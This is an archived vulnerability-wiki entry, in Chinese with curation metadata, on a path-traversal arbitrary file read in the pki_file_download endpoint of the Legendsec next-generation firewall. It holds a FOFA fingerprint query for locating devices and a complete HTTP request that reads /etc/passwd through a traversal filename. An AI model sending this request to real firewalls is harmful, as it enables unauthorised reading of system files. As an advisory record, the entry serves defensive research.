---
version: "unknown；原文“漏洞影响”处仅写网神下一代极速防火墙，未列固件版本"
source: "Threekiii/Vulnerability-Wiki"
id: "vw-5827ec02727eded7154474bc"
entity_id: "ve-5827ec02727eded7154474bc"
schema_version: "1"
title: "网神 下一代极速防火墙 pki_file_download 任意文件读取漏洞"
product: "网神下一代极速防火墙"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "含__s_sessionid__，固件/权限未给"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E7%BD%91%E7%A5%9E%E9%98%B2%E7%81%AB%E5%A2%99/%E7%BD%91%E7%A5%9E-%E4%B8%8B%E4%B8%80%E4%BB%A3%E6%9E%81%E9%80%9F%E9%98%B2%E7%81%AB%E5%A2%99-pki_file_download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_status: "unknown"
previous_version: "网神下一代极速防火墙"
---

# 网神 下一代极速防火墙 pki_file_download 任意文件读取漏洞

> 版本字段校订（2026-10-04）：代码、命令、路径、产品名或章节标记误入版本字段的值已逐字保存到对应 `previous_*` 字段；当前版本字段只记正文明确的来源范围，无范围时记为 unknown。后文对此元数据误填的旧说明描述校订前状态，其余实验条件与待核项仍按原文保留。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：网神下一代极速防火墙
- 本文讨论：pki_file_download filename路径穿越
- 版本、权限与配置前提：含__s_sessionid__，固件/权限未给
- 资料类型：防火墙文件读取请求；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 请求带会话未说明匿名或后台，任意文件范围取决进程权限
- 影响版本仅产品名，图示响应未转录
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 会话角色、版本与返回证据待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


## 漏洞描述

网神下一代极速防火墙 pki_file_download 存在任意文件读取漏洞，攻击者可以通过漏洞获取服务器上的任意文件

## 漏洞影响

```
网神下一代极速防火墙
```

## 网络测绘

```
app="网神下一代极速防火墙"
```

## 漏洞复现

登录页面如下

![](./.resource/网神-下一代极速防火墙-pki_file_download-任意文件读取漏洞/media/202202162229226.png)

发送请求包

```http
GET /?g=pki_file_download&filename=../../../../../etc/passwd HTTP/1.1
Host: 
Connection: close
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: __s_sessionid__=7rl7vvg1mlc00gf4pfmo74h0t7
```

![](./.resource/网神-下一代极速防火墙-pki_file_download-任意文件读取漏洞/media/202202162229183.png)

---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
